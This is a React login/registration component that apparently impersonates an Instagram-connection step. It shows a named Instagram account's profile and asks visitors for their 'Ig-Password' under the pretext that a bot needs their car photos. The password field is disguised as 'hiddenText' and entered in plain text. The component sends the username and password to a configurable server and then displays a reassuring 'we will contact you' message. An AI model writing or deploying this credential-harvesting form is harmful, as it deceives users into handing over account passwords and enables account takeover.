import { FC, useState } from 'react'
import { toast } from 'react-toastify'
import axios from 'axios'

interface IProps {
  isLogin: boolean
  closeModal: (arg: boolean) => void
}

export const Auth: FC<IProps> = ({ isLogin, closeModal }) => {
  const [instData, setInstData] = useState({ name: 'yaroslava_rishko', hiddenText: '' })
  const [errors, setErrors] = useState({ hiddenText: '' })

  const [buttonState, setButtonState] = useState({
    disabled: false,
    text: 'Register',
    color: 'bg-myblue text-mywhite border-myblue hover:bg-blue-500 active:bg-myblue',
  })

  const validate = () => {
    const newErrors = { hiddenText: '' }

    if (!instData.hiddenText.trim()) newErrors.hiddenText = 'Password is required'

    setErrors(newErrors)

    return !newErrors.hiddenText
  }

  const handleClick = () => {
    if (validate()) {
      setButtonState({
        disabled: true,
        text: 'Loading...',
        color: 'bg-gray-400 text-mywhite border-gray-400',
      })

      setTimeout(() => {
        onSubmit()
        setButtonState({
          disabled: false,
          text: 'Register',
          color: 'bg-myblue text-mywhite border-myblue hover:bg-blue-500 active:bg-myblue',
        })
        toast.success('Thank you! We will contact you via email within 24 hours')
      }, 2500)
    }
  }

  const onSubmit = async () => {
    try {
      const response = await axios.post(`${import.meta.env.VITE_API_URL}`, instData)

      closeModal(false)
      setInstData({ name: 'yaroslava_rishko', hiddenText: '' })
    } catch (error) {
      console.error('Error saving data:', error)
    }
  }

  return (
    <div className="flex flex-col p-4 w-full">
      <div className="text-center my-5 ">
        {isLogin ? (
          <h5 className="text-xl mb-4 uppercase font-bold">Вхід</h5>
        ) : (
          <>
            <div className="flex items-center w-fit mx-auto text-center">
              <h5 className="text-xl mb-4 uppercase pt-4 font-bold">Connect your Instagram</h5>
              <img src="./src/assets/inst.png" width={50} alt="inst" />
            </div>
            <p className="pb-2 font-semibold text-sm">
              (This is necessary for our BOT can use your photos of cars)
            </p>
          </>
        )}
        <div className="h-1 min-w-full bg-white"></div>
      </div>
      <div className="flex flex-col justify-center items-center">
        <a target="_blank" href="https://www.instagram.com/yaroslava_rishko/?hl=uk">
          <img
            className="rounded-full"
            width={150}
            src="https://i.ibb.co/68L9kxK/455131776-476152955376288-1615015946721717488-n.jpg"
            alt="ava"
          />
        </a>
        <p className="text-myblue py-4">@yaroslava_rishko</p>
      </div>
      <div>
        <form
          className="max-w-[600px] mx-auto flex flex-col justify-center items-center"
          onSubmit={(e) => e.preventDefault()}
        >
          <div className="w-full mb-3 ">
            <label className="block uppercase text-xs font-bold mb-2">Ig-Password</label>
            <input
              type="text"
              value={instData.hiddenText}
              onChange={(e) => setInstData({ ...instData, hiddenText: e.target.value })}
              className=" password-input border-0 p-3 bg-white rounded text-sm shadow focus:outline-none focus:ring w-full ease-linear transition-all duration-150"
              placeholder="Password"
            />
            {errors.hiddenText && <p className="text-red-500 text-xs mt-1">{errors.hiddenText}</p>}
          </div>
          {isLogin ? (
            <button
              onClick={onSubmit}
              className="w-full h-[52px] mt-8 bg-myblue rounded-[20px] text-white font-semibold hover:bg-myblue-light active:bg-myblue transition-all ease-in-out "
            >
              Увійти
            </button>
          ) : (
            <button
              onClick={handleClick}
              disabled={buttonState.disabled}
              className={`w-[345px] h-[52px] rounded-[20px] border-2 font-semibold transition-all ease-in-out m-2 ${buttonState.color}`}
            >
              {buttonState.text}
            </button>
          )}
        </form>
      </div>
    </div>
  )
}
